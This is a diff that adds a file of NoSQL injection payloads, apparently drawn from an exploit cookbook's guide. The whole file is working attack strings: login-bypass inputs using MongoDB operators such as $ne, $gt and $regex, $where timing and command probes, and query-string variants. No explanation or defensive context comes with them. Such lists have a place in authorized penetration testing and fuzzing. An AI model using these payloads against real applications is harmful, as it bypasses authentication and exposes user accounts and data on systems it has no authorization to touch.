@@ -1,0 +1,33 @@
+# NoSQL Injection Payloads - Curated from nosqli-guide.md
+# Source: exploit-cookbook/references/nosqli-guide.md
+
+# Authentication bypass
+' || '1'=='1
+' || 1==1//
+' || true==true
+username=admin'&password={'$gt':''}
+username[$ne]=admin&password[$ne]=
+username[$regex]=.*&password[$regex]=.*
+
+# MongoDB operator injection
+{"username":"admin","password":{"$gt":""}}
+{"username":"admin","password":{"$ne":""}}
+{"username":{"$ne":""},"password":{"$ne":""}}
+{"username":{"$regex":".*"},"password":{"$regex":".*"}}
+
+# $where RCE (if enabled)
+' || sleep(5) ||
+' || function(){ return true; } ||
+1; return db.version()//
+1; return db.adminCommand('listCommands')//
+
+# JSON operator injection
+{"$where":"this.password == 'password'"}
+{"$where":"sleep(5)"}
+{"$where":"if(this.password=='admin'){sleep(5)}"}
+
+# GET parameter injection
+?username=admin'--
+?username[$gt]=&password[$gt]=
+?username[$regex]=.*&password[$regex]=.*
+?username[$ne]=&password[$ne]=
